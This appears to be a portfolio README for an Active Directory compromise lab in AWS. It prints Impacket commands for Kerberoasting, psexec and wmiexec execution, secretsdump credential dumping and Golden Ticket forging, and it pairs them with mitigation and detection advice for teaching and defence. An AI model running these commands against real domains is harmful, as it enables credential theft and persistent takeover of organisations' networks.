# 🚨 Active Directory Domain Compromise Lab (AWS)

## ⚡ THE HOOK

I **fully compromised an Active Directory domain** in AWS—from a low-privileged domain user to forging Kerberos tickets for any account, including the Domain Administrator.

This lab demonstrates **how a single misconfigured service account creates a cascade of exploitable vulnerabilities** that leads to complete domain takeover.

---

## 📊 Quick Stats

| Metric | Result |
|--------|--------|
| **Starting Privilege Level** | Low-privilege domain user (jsmith) |
| **Final Privilege Level** | Domain Administrator + krbtgt access |
| **Attack Duration** | Multi-stage (enumeration → exploitation → persistence) |
| **Credentials Compromised** | 100% of domain (all users, all hashes) |
| **Persistence Method** | Golden Tickets (10-year validity) |

---

## 🎯 What This Demonstrates

### ✅ Offensive Security Skills
- **Active Directory Enumeration** - Service Principal Name (SPN) discovery, user reconnaissance
- **Kerberos Exploitation** - Ticket manipulation, Golden Ticket creation
- **Lateral Movement** - Credential harvesting, privilege escalation chains
- **Post-Exploitation** - Credential dumping, persistence mechanisms
- **Attack Sequencing** - Understanding how misconfigurations create exploit chains

### ✅ Defensive Security Thinking
- Identifying the **root cause** of compromise (service account in Domain Admins)
- Understanding **attack surface** in AD environments
- Recognizing **critical control gaps** (lack of credential protection, monitoring)
- Designing **defense-in-depth** strategies

---

## 🗺️ Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  PHASE 1: ENUMERATION                                     │
│  ───────────────────────────────────────────────────────  │
│                                                             │
│   Kali Linux → Domain Network                              │
│       ↓                                                     │
│   SPN Enumeration (GetUserSPNs)                            │
│       ↓                                                     │
│   DISCOVERY: sql_svc account (Domain Admins member)        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  PHASE 2: CREDENTIAL ACCESS                               │
│  ───────────────────────────────────────────────────────  │
│                                                             │
│   Kerberoasting / Credential Harvesting                    │
│       ↓                                                     │
│   COMPROMISE: sql_svc credentials obtained                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  PHASE 3: LATERAL MOVEMENT & RCE                          │
│  ───────────────────────────────────────────────────────  │
│                                                             │
│   psexec / wmiexec (via SMB)                               │
│       ↓                                                     │
│   EXECUTION: Remote shell on domain-joined system          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  PHASE 4: PRIVILEGE ESCALATION                            │
│  ───────────────────────────────────────────────────────  │
│                                                             │
│   sql_svc is Domain Admin → SYSTEM access                  │
│       ↓                                                     │
│   ESCALATION: SYSTEM-level token obtained                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  PHASE 5: CREDENTIAL DUMPING                              │
│  ───────────────────────────────────────────────────────  │
│                                                             │
│   impacket-secretsdump (Domain Controller)                 │
│       ↓                                                     │
│   EXTRACTION: All domain hashes, krbtgt key                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  PHASE 6: PERSISTENCE & DOMAIN COMPROMISE                 │
│  ───────────────────────────────────────────────────────  │
│                                                             │
│   Golden Ticket Creation (using krbtgt hash)               │
│       ↓                                                     │
│   RESULT: Forged tickets as any user (10-year validity)    │
│   IMPACT: Complete, persistent domain compromise           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 💥 Impact Analysis

### What an Attacker Can Now Do

| Capability | Impact | Exploitability |
|-----------|--------|-----------------|
| **Golden Tickets** | Forge Kerberos tickets as any user (including DA) | Trivial |
| **Pass-the-Hash** | Authenticate as any user via NTLM | Trivial |
| **Lateral Movement** | Access any domain-joined system | Unrestricted |
| **Persistence** | Maintain access indefinitely | 10+ years (ticket validity) |
| **Privilege Escalation** | Promote compromised accounts to DA | Instantaneous |
| **Data Exfiltration** | Access all domain resources | Unrestricted |

### What the Organization Lost

```
✗ Confidentiality: All credentials exposed
✗ Integrity: Any file can be modified by attacker
✗ Availability: Any system can be shut down by attacker
✗ Trust: All domain authentication compromised
✗ Incident Response: Attacker has DA access to monitoring systems
```

---

## 🔍 Detailed Attack Chain

### Phase 1: Enumeration
```bash
# SPN enumeration reveals service accounts
impacket-GetUserSPNs corp.local/jsmith:password

# Key Discovery:
# - sql_svc account running MSSQL
# - sql_svc is member of Domain Admins group
# - High-value target for lateral movement
```

**Why this matters:** Service accounts with excessive privileges are common misconfigurations. One compromised account = entire domain at risk.

---

### Phase 2: Credential Access
```bash
# Kerberoasting attack
impacket-GetUserSPNs corp.local/jsmith:password -request

# Result: TGS ticket obtained and cracked offline
# sql_svc credentials recovered
```

**Why this matters:** Service accounts often have weak passwords. Kerberos allows offline cracking with no alerts.

---

### Phase 3: Remote Code Execution
```bash
# Method 1: PSExec (SMB-based)
impacket-psexec corp.local/sql_svc:password@target-ip cmd.exe

# Method 2: WMIExec (WMI-based)
impacket-wmiexec corp.local/sql_svc:password@target-ip cmd.exe
```

**Why this matters:** Once credentials are compromised, moving laterally is trivial. SMB and WMI are enabled by default on Windows domains.

---

### Phase 4: Privilege Escalation
```bash
# Check current privileges
whoami /all

# Output shows:
# - Member of Domain Admins
# - Token elevation: Not required (already Admin)
```

**Why this matters:** The service account was already Domain Admin. No additional escalation needed—it's a direct path to domain compromise.

---

### Phase 5: Credential Dumping
```bash
# Extract all domain credentials from DC
impacket-secretsdump corp.local/sql_svc:password@dc-ip -outputfile hashes

# Retrieved:
# ✓ Administrator NTLM hash
# ✓ krbtgt NTLM hash (CRITICAL)
# ✓ All domain user hashes
# ✓ Machine account hashes
```

**Why this matters:** The krbtgt hash is the master key to the kingdom. It allows forging any Kerberos ticket, bypassing all authentication.

---

### Phase 6: Golden Ticket & Persistence
```bash
# Using the krbtgt hash, forge a Golden Ticket
# This allows impersonating ANY user, including DA
impacket-ticketer -nthash [krbtgt_hash] -domain-sid [sid] -domain corp.local Administrator

# Result:
# - Valid Kerberos ticket as Domain Administrator
# - Valid for 10 years
# - No password required
# - No alerts generated
```

**Why this matters:** Golden Tickets are the ultimate persistence mechanism. The attacker maintains access even if all passwords are changed.

---

## 🎓 Key Vulnerabilities Exploited

### Root Cause: Service Account in Domain Admins

| Vulnerability | CVSS | Impact |
|---------------|------|--------|
| Service account excessive privileges | N/A | Critical |
| Lack of credential protection | N/A | Critical |
| No monitoring on credential access | N/A | Critical |
| Weak service account passwords | N/A | High |
| NTLM relay vulnerability | 8.1 | High |
| Kerberos delegation abuse | 8.8 | High |

---

## 🛡️ How to Prevent This

### Immediate (Critical - Do Today)
1. **Remove service accounts from Domain Admins group**
   - Service accounts should never have domain admin rights
   - Use service-specific groups instead

2. **Enable Windows Credential Guard**
   - Protects credentials in isolated container
   - Prevents secretsdump attacks

3. **Implement LAPS** (Local Administrator Password Solution)
   - Randomize local admin passwords
   - Limits local account exploitation

### Short-term (High - This Week)
4. **Enforce MFA on admin accounts**
   - Block Golden Ticket abuse
   - Require interactive authentication

5. **Monitor Kerberos activity**
   - Alert on suspicious TGS requests
   - Monitor for ticket forgery patterns

6. **Implement tiered admin model**
   - Separate credentials for different privilege tiers
   - Admin workstations for sensitive operations

### Long-term (Ongoing)
7. **Enable AES encryption for Kerberos**
   - Disable RC4 (weak encryption)
   - Require stronger encryption standards

8. **Deploy EDR solution** (Endpoint Detection & Response)
   - Detect suspicious Kerberos ticket usage
   - Monitor credential access patterns

9. **Regular AD security audits**
   - Quarterly privilege access reviews
   - Annual penetration testing

---

## 🧠 Thinking Like an Attacker

### The Attacker's Mindset
```
Question: "What's the easiest way to compromise this domain?"
Answer: "Find a service account with excessive privileges."

Why? Because:
✓ Service accounts have predictable patterns
✓ They're often in privileged groups unnecessarily
✓ Their passwords may never change
✓ They authenticate to every system
✓ One compromise = multiple systems compromised
```

### The Key Insight
**This wasn't a sophisticated 0-day attack. This was exploiting a common misconfiguration that exists in thousands of organizations.**

The attacker didn't need advanced techniques—they just needed to understand:
1. How Active Directory works
2. Where the weaknesses typically are
3. How to chain misconfigurations together

---

## 📚 Lab Environment

| Component | Details |
|-----------|---------|
| **Domain Controller** | Windows Server 2019 (AWS EC2) |
| **Attacker Machine** | Kali Linux |
| **Domain** | corp.local |
| **Initial Access** | Low-privilege domain user (jsmith) |
| **Target Service Account** | sql_svc (Domain Admins member) |
| **Attack Tools** | Impacket suite, Kerberos utilities |

---

## 📁 Repository Structure

```
.
├── README.md                          # This file
├── attack-chain/
│   ├── 01_enumeration.md              # SPN discovery
│   ├── 02_credential_access.md        # Kerberoasting
│   ├── 03_lateral_movement.md         # psexec / wmiexec
│   ├── 04_privilege_escalation.md     # Domain admin access
│   ├── 05_credential_dumping.md       # secretsdump output
│   └── 06_persistence.md              # Golden tickets
├── scripts/
│   ├── enumeration.sh                 # SPN enumeration
│   ├── exploit.sh                     # RCE execution
│   ├── persistence.sh                 # Golden ticket creation
│   └── cleanup.sh                     # Lab cleanup
├── screenshots/
│   ├── spn_enumeration.png
│   ├── rce_shell.png
│   ├── credential_dump.png
│   └── golden_ticket.png
└── documentation/
    ├── defense_strategies.md
    ├── incident_response.md
    └── forensics_guide.md
```

---

## 🚀 Quick Start (For Lab Setup)

### Prerequisites
- AWS account
- Kali Linux
- Impacket toolkit
- Network connectivity to lab systems

### Deploy
```bash
# 1. Clone repository
git clone https://github.com/rubin041913/Active-Directory-Domain-Compromise-Lab-AWS-.git

# 2. Review attack chain documentation
cat attack-chain/01_enumeration.md

# 3. Execute attack phases
./scripts/enumeration.sh
./scripts/exploit.sh
./scripts/persistence.sh
```

---

## 📈 Lessons Learned

### For Red Teamers
- Service accounts are high-value targets
- Privilege escalation is often unnecessary (already admin)
- Credential dumping is the ultimate goal
- Persistence can be achieved without malware (Golden Tickets)

### For Blue Teamers
- Single point of failure: one service account = domain compromise
- Detection must focus on unusual Kerberos activity
- Credential protection mechanisms are essential
- Privilege access management is critical

### For Security Leaders
- This attack required no zero-days, no advanced techniques
- It exploited common misconfigurations found in real organizations
- The impact is complete: confidentiality, integrity, availability all compromised
- Prevention requires policy changes, not just technology

---

## 💼 What Recruiters Should See

### Skills Demonstrated
✅ **Offensive Security** - Enumeration, exploitation, lateral movement, privilege escalation  
✅ **Defensive Thinking** - Root cause analysis, mitigation strategies, detection methods  
✅ **System Architecture** - Understanding how AD, Kerberos, SMB, and WMI interact  
✅ **Methodical Approach** - Following structured attack frameworks (MITRE ATT&CK)  
✅ **Communication** - Explaining complex security concepts clearly  

### Why This Matters
This lab proves you can:
1. **Think like an attacker** - Understand threat actor methodology
2. **Think like a defender** - Design controls to prevent compromise
3. **Identify misconfigurations** - Spot security weaknesses before they're exploited
4. **Execute attacks methodically** - Follow a structured approach from reconnaissance to persistence
5. **Document findings** - Communicate security impact clearly

---

## ⚠️ Ethical & Legal Notice

**This lab is for educational purposes only.**

- All testing was performed in a controlled AWS lab environment
- No unauthorized systems were accessed
- All activities were documented and reviewed
- This demonstrates real attack chains used by threat actors
- Use this knowledge to secure your own organization

---

## 📖 Additional Resources

- [MITRE ATT&CK Framework](https://attack.mitre.org/) - Map techniques to this lab
- [AD Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [Kerberos Deep Dive](https://en.wikipedia.org/wiki/Kerberos_(protocol))

---

## 📧 Questions?

For questions about this lab or how to set it up, open an issue or reach out.

---

**Last Updated:** June 29, 2026  
**Created by:** rubin041913  
**Difficulty Level:** Advanced  
**Time to Complete:** 4-6 hours

---

*Remember: The goal of security research is to make systems safer, not to cause harm.*